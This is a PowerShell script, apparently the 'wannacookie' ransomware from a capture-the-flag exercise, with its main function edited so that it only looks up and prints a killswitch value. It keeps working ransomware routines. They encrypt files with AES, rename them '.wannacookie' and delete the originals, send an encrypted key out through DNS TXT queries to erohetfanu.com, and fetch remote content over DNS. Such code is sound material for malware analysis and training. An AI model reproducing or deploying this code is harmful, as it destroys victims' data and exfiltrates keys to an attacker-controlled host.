﻿$functions = {
    function e_d_file($key, $File, $enc_it) {
        [byte[]]$key = $key;
        $Suffix = "`.wannacookie";
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
        [System.Int32]$KeySize = $key.Length*8;
        $AESP = New-Object 'System.Security.Cryptography.AesManaged';
        $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
        $AESP.BlockSize = 128;
        $AESP.KeySize = $KeySize;
        $AESP.Key = $key;
        $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);
        if ($enc_it) {
            $DestFile = $File + $Suffix
        }
        else {
            $DestFile = ($File -replace $Suffix)
        }
        ;
        $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);
        if ($enc_it) {
            $AESP.GenerateIV();
            $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);
            $FileSW.Write($AESP.IV, 0, $AESP.IV.Length);
            $Transform = $AESP.CreateEncryptor()
        }
        else {
            [Byte[]]$LenIV = New-Object Byte[] 4;
            $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;
            $FileSR.Read($LenIV,  0, 3) | Out-Null;
            [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0);
            [Byte[]]$IV = New-Object Byte[] $LIV;
            $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;
            $FileSR.Read($IV, 0, $LIV) | Out-Null;
            $AESP.IV = $IV;
            $Transform = $AESP.CreateDecryptor()
        }
        ;
        $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);
        [Int]$Count = 0;
        [Int]$BlockSzBts = $AESP.BlockSize / 8;
        [Byte[]]$Data = New-Object Byte[] $BlockSzBts;
        Do {
            $Count = $FileSR.Read($Data, 0, $BlockSzBts);
            $CryptoS.Write($Data, 0, $Count)
        }
        While ($Count -gt 0);
        $CryptoS.FlushFinalBlock();
        $CryptoS.Close();
        $FileSR.Close();
        $FileSW.Close();
        Clear-variable -Name "key";
        Remove-Item $File
    }
}
;
function H2B {
    param($HX);
    $HX = $HX -split '(..)' | ? {
        $_
    };
    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
};
function A2H(){
    Param($a);
    $c = '';
    $b = $a.ToCharArray();
    ;
    Foreach ($element in $b) {
        $c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    }
    ;
    return $c -replace ' '
}
;
function H2A() {
    Param($a);
    $outa;
    $a -split '(..)' | ? {
        $_
    } | forEach {
        [char]([convert]::toint16($_,16))
    } | forEach {
        $outa = $outa + $_
    }
    ;
    return $outa
}
;
function B2H {
    param($DEC);
    $tmp = '';
    ForEach ($value in $DEC){
        $a = "{0:x}" -f [Int]$value;
        if ($a.length -eq 1){
            $tmp += '0' + $a
        }
        else {
            $tmp += $a
        }
    }
    ;
    return $tmp
}
;
function ti_rox {
    param($b1, $b2);
    $b1 = $(H2B $b1);
    $b2 = $(H2B $b2);
    $cont = New-Object Byte[] $b1.count;
    if ($b1.count -eq $b2.count) {
        for($i=0;
        $i -lt $b1.count ;
        $i++) {
            $cont[$i] = $b1[$i] -bxor $b2[$i]
        }
    }
    ;
    return $cont
}
;
function B2G {
    param([byte[]]$Data);
    Process {
        $out = [System.IO.MemoryStream]::new();
        $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress);
        $gStream.Write($Data, 0, $Data.Length);
        $gStream.Close();
        return $out.ToArray()
    }
}
;
function G2B {
    param([byte[]]$Data);
    Process {
        $SrcData = New-Object System.IO.MemoryStream( , $Data );
        $output = New-Object System.IO.MemoryStream;
        $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress);
        $gStream.CopyTo( $output );
        $gStream.Close();
        $SrcData.Close();
        [byte[]] $byteArr = $output.ToArray();
        return $byteArr
    }
}
;
function sh1([String] $String) {
    $SB = New-Object System.Text.StringBuilder;
    [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
        [Void]$SB.Append($_.ToString("x2"))
    }
    ;
    $SB.ToString()
}
;
function p_k_e($key_bytes, [byte[]]$pub_bytes){
    $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
    $cert.Import($pub_bytes);
    $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true);
    return $(B2H $encKey)
}
;
function e_n_d {
    param($key, $allfiles, $make_cookie );
    $tcount = 12;
    for ( $file=0;
    $file -lt $allfiles.length;
    $file++  ) {
        while ($true) {
            $running = @(Get-Job | Where-Object {
                $_.State -eq 'Running'
            }
            );
            if ($running.Count -le $tcount) {
                Start-Job  -ScriptBlock {
                    param($key, $File, $true_false);
                    try{
                        e_d_file $key $File $true_false
                    }
                    catch {
                        $_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
                    }
                } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions;
                break
            }
            else {
                Start-Sleep -m 200;
                continue
            }
        }
    }
}
;
function g_o_dns($f) {
    $h = '';
    foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {
        $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
        Out-File -FilePath $($f+'.hex') -Append -InputObject $h
    };
    $a = H2A($h)
    Out-File -FilePath $($f+'.html') -InputObject $a
    return (H2A $h)
}
;
function s_2_c($astring, $size=32) {
    $new_arr = @();
    $chunk_index=0;
    foreach($i in 1..$($astring.length / $size)) {
        $new_arr += @($astring.substring($chunk_index,$size));
        $chunk_index += $size
    }
    ;
    return $new_arr
}
;
function snd_k($enc_k) {
    $chunks = (s_2_c $enc_k );
    foreach ($j in $chunks) {
        if ($chunks.IndexOf($j) -eq 0) {
            $n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        }
        else {
            $(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        }
    }
    ;
    return $n_c_id
}
;
function wanc {
    $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
    #killswitch check
    #if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
    #    return
    #};
    # does some checks for specific domain and to see if malware already running
    #if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {
    #    return
   $ks = $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings;
   $kso = $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $ks)))
   Write-Host $ks;
   Write-Host $kso;
   }
;
wanc;